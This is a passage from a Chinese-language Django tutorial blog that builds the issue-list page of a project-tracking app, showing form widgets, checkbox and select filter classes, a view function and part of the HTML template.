<span class="comment"># 使用bootstrap-selec选择器</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">"issues_type"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">'selectpicker'</span>,&#125;),</span><br><span class="line">            <span class="string">"priority"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">'selectpicker'</span>,&#125;),</span><br><span class="line">            <span class="string">"status"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">'selectpicker'</span>,&#125;),</span><br><span class="line">            <span class="string">"mode"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">'selectpicker'</span>,&#125;),</span><br><span class="line">            <span class="string">"parent"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">'selectpicker'</span>,<span class="string">"data-live-search"</span>:<span class="string">"true"</span>&#125;),</span><br><span class="line">            <span class="string">"assign"</span>:forms.Select(attrs=&#123;<span class="string">'class'</span>:<span class="string">"selectpicker"</span>,<span class="string">"data-live-search"</span>:<span class="string">"true"</span>&#125;),</span><br><span class="line">            <span class="string">"attention"</span>:forms.SelectMultiple(attrs=&#123;<span class="string">'class'</span>:<span class="string">"selectpicker"</span>,<span class="string">"data-live-search"</span>:<span class="string">"true"</span>,<span class="string">"data-actions-box"</span>:<span class="string">"true"</span>&#125;),</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,request,*args,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args,**kwargs)</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理数据初始化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 获取当前项目的所有问题类型 [(1,'xx'),(2,'xx')]</span></span><br><span class="line">        self.fields[<span class="string">'issues_type'</span>].choices = models.IssuesTyle.objects.filter(project=request.tracer.project).values_list(<span class="string">'id'</span>,<span class="string">'title'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 获取当前项目的所有模块</span></span><br><span class="line">        module_list = [(<span class="string">""</span>,<span class="string">"没有选中任何项"</span>),]</span><br><span class="line">        module_obj_list = models.Module.objects.filter(project=request.tracer.project).values_list(<span class="string">'id'</span>, <span class="string">'title'</span>)</span><br><span class="line">        module_list.extend(module_obj_list)</span><br><span class="line">        self.fields[<span class="string">'module'</span>].choices = module_list</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 指派 &amp; 关注者</span></span><br><span class="line">        <span class="comment"># 数据库中找到当前项目的参与者 &amp; 创建者</span></span><br><span class="line">        total_user_list = [(request.tracer.project.creator_id,request.tracer.project.creator.username),]</span><br><span class="line">        project_user_list = models.ProjectUser.objects.filter(project=request.tracer.project).values_list(<span class="string">'user_id'</span>,<span class="string">'user__username'</span>)</span><br><span class="line"></span><br><span class="line">        total_user_list.extend(project_user_list)</span><br><span class="line">        self.fields[<span class="string">'assign'</span>].choices = [(<span class="string">''</span>,<span class="string">'没有选中任何项'</span>)] + total_user_list</span><br><span class="line">        self.fields[<span class="string">'attention'</span>].choices = total_user_list</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 当前项目已创建的问题</span></span><br><span class="line">        parent_list = [(<span class="string">""</span>,<span class="string">"没有选中任何项"</span>)]</span><br><span class="line">        parent_obj_list = models.Issues.objects.filter(project=request.tracer.project).values_list(<span class="string">'id'</span>,<span class="string">'subject'</span>)</span><br><span class="line">        parent_list.extend(parent_obj_list)</span><br><span class="line">        self.fields[<span class="string">'parent'</span>].choices = parent_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题的回复</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 项目的邀请码</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>由于form表单生成的至于理想的不同，原因是，模块和是ForeignKey，需要获取关联的表的值。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckFilter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, data_list, request)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.data_list = data_list</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""""</span></span><br><span class="line"><span class="string">        priority_choices = (</span></span><br><span class="line"><span class="string">        ("danger", "高"),</span></span><br><span class="line"><span class="string">        ("warning", "中"),</span></span><br><span class="line"><span class="string">        ("success", "低"),</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> self.data_list:</span><br><span class="line">            key = str(item[<span class="number">0</span>])</span><br><span class="line">            text = item[<span class="number">1</span>]</span><br><span class="line">            ck = <span class="string">""</span></span><br><span class="line">            <span class="comment"># 判断如果当前用户请求的URL中status和当前循环key相等</span></span><br><span class="line">            value_list = self.request.GET.getlist(self.name)</span><br><span class="line">            <span class="comment"># print(value_list)</span></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> value_list:</span><br><span class="line">                ck = <span class="string">'checked'</span></span><br><span class="line">                value_list.remove(key)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                value_list.append(key)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成url</span></span><br><span class="line">            <span class="comment"># 在当前的url参数增加一项</span></span><br><span class="line">            query_dict = self.request.GET.copy()</span><br><span class="line">            query_dict._mutable = <span class="literal">True</span></span><br><span class="line">            query_dict.setlist(self.name, value_list)  <span class="comment"># &#123;'status':[1,2,3]&#125;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'page'</span> <span class="keyword">in</span> query_dict:</span><br><span class="line">                query_dict.pop(<span class="string">'page'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 移除？号</span></span><br><span class="line">            param_url = query_dict.urlencode()</span><br><span class="line">            <span class="keyword">if</span> param_url:</span><br><span class="line">                <span class="comment"># urlencode可以把字典生成，status=1&amp;status=2&amp;status=3</span></span><br><span class="line">                url = <span class="string">"&#123;&#125;?&#123;&#125;"</span>.format(self.request.path_info,query_dict.urlencode())  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = self.request.path_info</span><br><span class="line"></span><br><span class="line">            html = <span class="string">'&lt;a class="cell" href="&#123;url&#125;"&gt;&lt;input type="checkbox" &#123;ck&#125;/&gt;&lt;label&gt;&#123;text&#125;&lt;/label&gt;&lt;/a&gt;'</span>.format(url=url,ck=ck,text=text)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">yield</span> mark_safe(html)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>与上面原因相同，form表单与理想的不同，原因关注者是ManyToManyField，需要关联的表的值。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SelectFilter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, data_list, request)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.data_list = data_list</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> mark_safe(<span class="string">"&lt;select class='select2' multiple='multiple' style='width:100%'&gt;"</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> self.data_list:</span><br><span class="line">            key = str(item[<span class="number">0</span>])</span><br><span class="line">            text = item[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            selected = <span class="string">""</span></span><br><span class="line">            value_list = self.request.GET.getlist(self.name)</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> value_list:</span><br><span class="line">                selected = <span class="string">"selected"</span></span><br><span class="line">                value_list.remove(key)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                value_list.append(key)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成url</span></span><br><span class="line">            <span class="comment"># 在当前的url参数增加一项</span></span><br><span class="line">            query_dict = self.request.GET.copy()</span><br><span class="line">            query_dict._mutable = <span class="literal">True</span></span><br><span class="line">            query_dict.setlist(self.name, value_list)  <span class="comment"># &#123;'status':[1,2,3]&#125;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'page'</span> <span class="keyword">in</span> query_dict:</span><br><span class="line">                query_dict.pop(<span class="string">'page'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 移除？号</span></span><br><span class="line">            param_url = query_dict.urlencode()</span><br><span class="line">            <span class="keyword">if</span> param_url:</span><br><span class="line">                <span class="comment"># urlencode可以把字典生成，status=1&amp;status=2&amp;status=3</span></span><br><span class="line">                url = <span class="string">"&#123;&#125;?&#123;&#125;"</span>.format(self.request.path_info,query_dict.urlencode())  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = self.request.path_info</span><br><span class="line"></span><br><span class="line">            html = <span class="string">"&lt;option value='&#123;url&#125;' &#123;selected&#125;&gt;&#123;text&#125;&lt;/option&gt;"</span>.format(url=url,selected=selected, text=text)</span><br><span class="line">            <span class="keyword">yield</span> mark_safe(html)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> mark_safe(<span class="string">"&lt;/select&gt;"</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>问题管理的视图函数</strong></p><p>新建<code>issues.py</code>文件，用于存放问题管理相关的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 问题列表 """</span></span><br><span class="line">    form = IssuesModelForm(request)</span><br><span class="line">    issues_obj_list = queryset[page.start:page.end]</span><br><span class="line">    project_issues_type = models.IssuesTyle.objects.filter(project_id=project_id).values_list(<span class="string">'id'</span>, <span class="string">'title'</span>)</span><br><span class="line"></span><br><span class="line">    project_total_user = [(request.tracer.project.creator_id, request.tracer.project.creator.username)]</span><br><span class="line">    project_join_user = models.ProjectUser.objects.filter(project_id=project_id).values_list(<span class="string">'user_id'</span>,<span class="string">'user__username'</span>)</span><br><span class="line">    project_total_user.extend(project_join_user)</span><br><span class="line">    </span><br><span class="line">    context = &#123;</span><br><span class="line">            <span class="string">'form'</span>: form,</span><br><span class="line">            <span class="string">'filter_list'</span>: [</span><br><span class="line">                &#123;<span class="string">'title'</span>: <span class="string">'问题类型'</span>, <span class="string">'filter'</span>: CheckFilter(<span class="string">'issues_type'</span>, project_issues_type, request)&#125;,</span><br><span class="line">                &#123;<span class="string">'title'</span>: <span class="string">'状态'</span>, <span class="string">'filter'</span>: CheckFilter(<span class="string">'status'</span>, models.Issues.status_choices, request)&#125;,</span><br><span class="line">                &#123;<span class="string">'title'</span>: <span class="string">'优先级'</span>, <span class="string">'filter'</span>: CheckFilter(<span class="string">'priority'</span>, models.Issues.priority_choices, request)&#125;,</span><br><span class="line">                &#123;<span class="string">'title'</span>: <span class="string">'指派者'</span>, <span class="string">'filter'</span>: SelectFilter(<span class="string">'assign'</span>, project_total_user, request)&#125;,</span><br><span class="line">                &#123;<span class="string">'title'</span>: <span class="string">'关注者'</span>, <span class="string">'filter'</span>: SelectFilter(<span class="string">'attention'</span>, project_total_user, request)&#125;,</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/issues.html'</span>, context)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>问题管理issues.html的相关代码</strong></p><p>在manage文件夹下，新建issues.html文件用于存放问题管里的前端代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% load issues %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line"><span class="comment">&lt;!-- 引用bootstrap-datepicker日期选择器和bootstrap-select选择器 --&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/editor-md/css/editormd.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/css/bootstrap-datepicker.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/css/bootstrap-select.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.issues-list</span> <span class="selector-class">.number</span> &#123;</span></span><br><span class="line">            width: 100px;</span><br><span class="line">            text-align: right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.issues-list</span> <span class="selector-class">.number</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            font-weight: 500;</span><br><span class="line">            padding: 0 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.issues-list</span> <span class="selector-class">.issue</span> <span class="selector-class">.tags</span> &#123;</span></span><br><span class="line">            padding: 10px 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.issues-list</span> <span class="selector-class">.issue</span> <span class="selector-class">.tags</span> <span class="selector-tag">span</span> &#123;</span></span><br><span class="line">            margin-right: 20px;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            font-size: 12px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.issues-list</span> <span class="selector-class">.issue</span> <span class="selector-class">.tags</span> <span class="selector-class">.type</span> &#123;</span></span><br><span class="line">            color: white;</span><br><span class="line">            padding: 1px 5px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.editormd</span> &#123;</span></span><br><span class="line">            margin-bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.pd-0</span> &#123;</span></span><br><span class="line">            padding: 0 !important;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line">            margin-bottom: 17px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        筛选</span><br><span class="line">         */</span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> &#123;</span></span><br><span class="line">            margin-bottom: 15px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> <span class="selector-tag">title</span> &#123;</span></span><br><span class="line">            padding: 5px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> <span class="selector-class">.check-list</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            text-decoration: none;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            min-width: 65px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> <span class="selector-class">.check-list</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line">            font-weight: 200;</span><br><span class="line">            font-size: 13px;</span><br><span class="line">            margin-left: 3px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> <span class="selector-class">.check-list</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line">            font-weight: 300;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.filter-area</span> <span class="selector-class">.item</span> <span class="selector-class">.check-list</span> <span class="selector-class">.cell</span> &#123;</span></span><br><span class="line">            margin-right: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-id">#inviteForm</span> <span class="selector-tag">div</span> &#123;</span></span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#inviteArea</span> <span class="selector-tag">hr</span>&#123;</span></span><br><span class="line">            margin-top: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid clearfix"</span> <span class="attr">style</span>=<span class="string">"padding: 20px 0;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--  筛选的相关代码  --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-9"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-quora"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 问题<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 